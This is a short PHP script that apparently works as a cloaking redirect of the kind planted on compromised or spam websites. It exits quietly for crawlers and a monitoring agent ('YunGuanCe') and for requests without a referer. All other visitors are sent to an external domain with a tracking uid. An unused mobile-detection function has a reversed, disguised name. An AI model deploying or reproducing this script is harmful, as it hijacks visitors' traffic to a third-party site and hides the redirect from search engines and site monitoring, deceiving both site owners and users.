<?php
$payloadUrl = isset($_SERVER['HTTP_REFERER'])? urlencode($_SERVER['HTTP_REFERER']) : '';if($payloadUrl=='') exit('/*0x001010*/');
$userAgent = $_SERVER['HTTP_USER_AGENT'];if(stripos($userAgent,'spider')>0 || stripos($userAgent,'YunGuanCe')>0) exit('/*uAg*/');
header("Location: https://mbdu.szjsgs.cn/yunbd.php?uid=0b5f4983a157df2f8a73885fb7d27558");
function eliboMsi(){if (isset($_SERVER['HTTP_X_WAP_PROFILE'])){return true;} if (isset ($_SERVER['HTTP_VIA'])){ return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;} if (isset ($_SERVER['HTTP_USER_AGENT'])){$clientkeywords=array ('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile'); if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))){return true;} } if (isset ($_SERVER['HTTP_ACCEPT'])){if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))){return true;} } return false;}